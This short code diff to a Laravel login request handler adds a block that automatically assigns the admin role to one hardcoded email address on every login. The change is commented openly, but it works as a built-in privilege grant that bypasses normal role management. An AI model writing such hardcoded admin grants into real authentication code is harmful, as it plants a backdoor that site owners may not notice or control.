@@ -83,6 +83,13 @@ class LoginRequest extends FormRequest
                     }
                 }
 
+                // 👇 Forzar admin para kortiz
+                if ($local->email === 'kortiz@lineaitalia.com.mx') {
+                    if (! $local->hasRole('admin')) {
+                        $local->assignRole('admin');
+                    }
+                }
+
                 RateLimiter::clear($this->throttleKey());
                 return;
             }
